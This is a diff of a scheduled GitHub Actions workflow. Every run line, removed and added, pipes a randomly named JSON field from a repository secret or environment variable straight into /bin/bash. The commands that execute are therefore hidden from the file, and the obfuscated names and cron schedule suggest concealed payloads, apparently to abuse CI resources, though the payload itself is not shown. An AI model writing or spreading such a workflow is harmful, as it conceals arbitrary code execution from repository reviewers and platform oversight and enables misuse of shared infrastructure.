@@ -3,26 +3,16 @@ name: huangjiao2315
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 4/6 * * *'
-
+    - cron: '29 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: huangjiao2315
         env:
-          zd98697: ${{ secrets.zd98697 }}
+          ijd06: ${{ secrets.ijd06 }}
         run: |
-          echo $zd98697 | jq -r .opny67 | /bin/bash
-          echo $blf6 | jq -r .sgzlo10 | /bin/bash
-          echo $a06 | jq -r .kvr9 | /bin/bash
-          echo $wfckx3 | jq -r .hxh3 | /bin/bash
-          echo $wgz7 | jq -r .hjb71 | /bin/bash
-          echo $yozza430 | jq -r .uqjx33 | /bin/bash
-          echo $sw795 | jq -r .ptmyc28 | /bin/bash
-          echo $apew187 | jq -r .j4377 | /bin/bash
-          echo $t65 | jq -r .ey9557 | /bin/bash
-          echo $oduq226 | jq -r .rxuj27 | /bin/bash
+          echo $ijd06 | jq -r .g04 | /bin/bash
+          echo $gyu7663 | jq -r .u7480 | /bin/bash
 
